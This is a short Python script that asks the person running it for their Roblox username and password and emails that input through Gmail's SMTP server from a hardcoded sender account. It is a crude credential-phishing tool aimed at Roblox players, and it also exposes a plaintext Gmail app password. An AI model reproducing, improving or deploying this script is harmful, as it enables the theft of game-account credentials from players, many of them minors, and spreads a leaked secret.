from email.message import EmailMessage
import ssl
import smtplib

email_sender = 'antixblox@gmail.com'
email_password = 'cjhuptxusagjeogy'
email_reciever = input("Enter your email: ")

subject = 'Welcome!'
body = input("Enter your username and password for roblox pls...: ")

em = EmailMessage()
em['From'] = email_sender
em['To'] = email_reciever
em['Subject'] = subject
em.set_content(body)

context = ssl.create_default_context()

with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
    smtp.login(email_sender, email_password)
    smtp.sendmail(email_sender, email_reciever, em.as_string())